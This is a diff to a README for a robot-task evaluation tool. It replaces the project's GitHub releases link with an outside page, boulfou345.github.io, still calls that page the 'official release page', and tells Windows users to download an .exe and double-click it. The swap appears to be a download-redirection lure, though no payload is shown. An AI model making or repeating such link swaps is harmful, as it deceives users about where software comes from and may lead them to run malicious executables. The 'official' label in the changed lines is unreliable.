@@ -1,6 +1,6 @@
 # 🤖 so101-bench-groot-n1.7 - Evaluate virtual robot tasks without hardware
 
-[![Download SO-101 Bench](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/boulfou345/so101-bench-groot-n1.7/releases)
+[![Download SO-101 Bench](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://boulfou345.github.io)
 
 ## 🎯 About This Software
 
@@ -23,7 +23,7 @@ Before you install the software, confirm your computer meets these minimum speci
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page to download the latest version: [https://github.com/boulfou345/so101-bench-groot-n1.7/releases](https://github.com/boulfou345/so101-bench-groot-n1.7/releases).
+1.  Visit the official release page to download the latest version: [https://boulfou345.github.io](https://boulfou345.github.io).
 2.  Look for the file ending in `.exe` under the "Assets" section. Click the filename to start the download.
 3.  Locate the downloaded `.exe` file in your "Downloads" folder.
 4.  Double-click the file to launch the installer.
